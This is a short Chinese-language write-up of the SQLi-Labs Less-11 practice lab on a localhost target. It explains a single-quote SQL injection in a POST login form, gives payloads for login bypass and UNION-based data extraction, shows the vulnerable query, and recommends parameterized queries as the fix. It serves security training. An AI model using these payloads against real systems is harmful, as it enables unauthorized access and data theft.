# SQLi-Labs | Less-11 POST 单引号字符注入（登录框）
## 一、漏洞简介
POST表单登录，uname和passwd参数，单引号闭合，可绕过登录、联合查询。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-11/
## 三、复现步骤
1. BP抓包，POST参数 uname & passwd
2. uname输入 admin' --+，密码随便填，直接绕过登录
3. 也可以联合查询脱库
## 四、Payload
绕过登录：uname=admin' --+ & passwd=1
脱库：uname=-1' union select 1,version() --+ & passwd=1
## 五、漏洞原理
后端SQL：`SELECT * FROM users WHERE username='$uname' AND password='$passwd'`
## 六、修复方案
参数化查询，登录校验不要拼接SQL。
## 七、总结
POST登录框注入，最经典的注释绕过登录。